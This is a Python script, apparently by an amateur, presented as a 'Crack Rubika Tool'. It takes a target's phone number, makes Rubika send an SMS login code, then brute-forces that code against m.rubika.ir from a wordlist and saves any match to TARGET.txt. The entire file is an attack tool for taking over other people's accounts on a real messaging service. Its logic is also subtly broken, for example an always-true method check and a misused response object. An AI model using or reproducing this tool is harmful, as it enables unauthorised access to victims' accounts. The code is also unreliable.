#!/usr/bin/python
#<<<<<<<<<noob hackers /mashhad>>>>>>
#////////////home/bin////////////////
#.....................................
# Crack Rubika Tool ! | => m.rubika.ir
#.....................................
#////////////me/mr-root//////////////
#<<<<<<<<<<<<< ultra noob >>>>>>>>>>>>
# im the ....................
__AUTHOR__ = '''THE MR ROOT'''
__RUNIKA__ = '''rubika.ir/TheServer'''
__TOOL__ = '''CRACKER RUBIKA'''
# ............................
import os,time,sys,random
# -----------------------


try:
    import requests
except:
    os.system("pip install requests")
    import requests
try:
    import pyuseragents
except:
    os.system("pip install pyuseragents")
try:
    import datetime
except:
    os.system("pip install datetime")
try:
    import pyfiglet
except:
    os.system ("pip install pyfiglet")
    import pyfiglet
#------------------

#-------------------------------
try:
    os.system("clear")
except:
    os.system("cls")
logo = ['cracker','rubika . ir','rubika','cracking','CrAcKeR','6 6 6']
banner = (random.choice(logo))
print ('\033[91m')
time.sleep(2)
print (pyfiglet.figlet_format(banner))
time.sleep(2)
print ('\n\n')
#----------------------
# date
date = (datetime.datetime.today())
#----------------------
# name file --
print (f'\n\033[20;37mfile {sys.argv[0]} \033[36mrunning [#] <\n\n')
print ()
print ('\033[36m')
os.system("date")
print ()
print ()
#-------------
# ----- number target -------
number = input(F"""
\n\033[20;37m-enter phone number target -\033[31m
\n[cracker-rubika/~]\033[92m@†.†.†:
\033[93m⟩⟩⟩\033[36m==============-\033[93m-⟩⟩⟩\033[95m """)
#--
#-----------
time.sleep(1)
# ---- method = [2] or [1] for crack
method = input ("""\n
\n\033[35m[#]\033[36m methods ==> :\n\n [PANEL]<0> or [AUTO]<1>\n\ntype here number method |\n
\033[31m
\n[cracker-rubika/~]\033[92m@†.†.†:
\033[93m⟩⟩⟩\033[36m==============-\033[93m-⟩⟩⟩\033[95 """)
# --------------------------------
try:
    method = int(method)
    if method == '0' or '1':
        time.sleep(1)
        print ('\n\033[92m[*] OK\n')
    else:
        time.sleep(1)
        print ("\n\033[31m[!] method not found \033[36m| method => auto")
        time.sleep(1)
        method = 1
except:
    time.sleep(1)
    print ("\n\033[31m[!] method not found \033[36m| methdo => auto")
    method = 1
    time.sleep(1)
    
#-
time.sleep(1)
#-------- codeslist file ------
code = input ("""\033[35m[#] \033[20;37m<ENTER CODES LIST FILE>\n\033[31m
\n[cracker-rubika/~]\033[92m@†.†.†:
\033[93m⟩⟩⟩\033[36m==============-\033[93m -⟩⟩⟩\033[95m """)
name = code
#------------------
# ..... test codeslist file ......
try:
    codes = open(name,"r").read().split()
except:
    print ("\n\033[31mcodelist not true [!]")
    codes = input ("\n\033[20;37m[#] > \033[36mcodes list - - >\033[35m ")
# ------- re'test codeslist file --------
try:
    codes = open(name,"r").read().split()
except:
    print ("\n\033[31mcodelist not true [!]")
    sys.exit()
#.........................................
# ------ headers -------------
time.sleep(0.5)
if method == 1:
    headers = {"Host": "https://messengerg2c1.iranlms.ir/","content-length": "95","Accept": "application/json, text/plain, */*","User-Agent": pyuseragents.random(),"content-type": "text/plain","origin": "https://m.rubika.ir","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://m.rubika.ir/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
    # --- json for code ----
    json = {"api_version":"2","auth":"","client":{"app_name":"Main","app_version":"1.2.1","package":"m.rubika.ir","platform":"PWA"},"data":{"phone_number": number, "send_type":"SMS"},"method":"sendCode"}
    data1 = {"status":"OK","status_det":"OK","index":"0", "landscape":"false" ,"data":{"phone_code_hash":None}}
    # .......................................
    # -------- sent code --------------
    try:
        time.sleep(1)
        requests.post("https://messengerg2c1.iranlms.ir/",headers=headers,json=json)
        print(F"\n\033[35m[*] \033[36mSENT CODE | \033[0mTO {number}")
    except:
        time.sleep(1)
        print("\033[31m[!] NOT SENT CODE")
        time.sleep(1)
# -------------------------------
# ----- open file ------
# method 2 
# if method == '0'
time.sleep(2)
codes = open(name,"r").read().split()
# ------- info target ------
print (f"\n\n\033[31mTARGET \033[20;37m-> \033[92m{number} | \033[93mSTART IN {date} | \033[20;37m> \033[95mfuck u\n\n")
#-----------------
time.sleep(2)
# ....... start test ..........

while True:
    for code in codes:
        headers2 = {'Host':'https://m.rubika.ir','User-Agent': pyuseragents.random(),'Accept':'application/json, text/plain, */*','content-length':'95','Content-Type':'application/json'}
        data = {"status":"OK","status_det":"OK","index":"0", "landscape":"false" ,"submit":"ورود", "_ga":"GA1.2.136.9312509.165.075.9611","_gid":"GA1.2.851086128.1656235386", "data":{"phone_number": number, "phone_code_hash": code}}
        try:
            time.sleep(1)
            def send():
                requests.post("https://m.rubika.ir/",headers=headers2, data=data)
                send = requests.post("https://m.rubika.ir/",headers=headers2, data=data)
            #--------
            send()
            print(f"\n\033[31m[*] \033[36mTEST CODE => \033[92m{code} |\033[35m FALSE")
        except:
            time.sleep(1)
            print("\n\033[31m[!] NOT TEST CODE")
        try:
            if "OK" in send.txt:
                time.sleep(2)
                print(f"\n\033[92m[*] \033[93mTEST CODE ! =>\033[35m |{code}| \033[35m[TRUE] \033[92m>_<")
                time.sleep(1)
                print (f"\033[31m[*] happy code => \033[35m| {code} |")
                time.sleep(1)
                try:
                    with open('TARGET.txt', 'w') as _target_:
                        _target_.write (f'phone number => [{number}]\ncode => [{code}]\ntime => {date}')
                        time.sleep(1)
                        print ("\n\033[31m[*] \033[20;37m<SAVED INFO TARGET TO [TARGET.txt]")
                        time.sleep(1)
                        sys.exit()
                except:
                    try:
                        os.system("touch TARGET.txt")
                    except:
                        os.system("sudo touch TARGET.txt")
                    try:
                        os.system(f"echo 'code = {code}' > TARGET.txt")
                        os.system(f"echo phone-number=[{number}] > TARGET.txt")
                        time.sleep(1)
                        print ("\n\033[31m[*] \033[36m<SAVED INFO TARGET TO [TARGET.txt]")
                        time.sleep(1)
                        sys.exit()
                    except:
                        os.system(f'sudo echo "code = {code}" > TARGET.txt')
                        os.system(f"sudo echo phone-number=[{number}] > TARGET.txt")
                        time.sleep(1)
                        print ("\n\033[31m[*] \033[36m<SAVED INFO TARGET TO [TARGET.txt]")
                        time.sleep(1)
                        sys.exit()
            else:
                None
        except:
            pass


# .... method find auth for user it is under construction!.....
# ........... the end .......
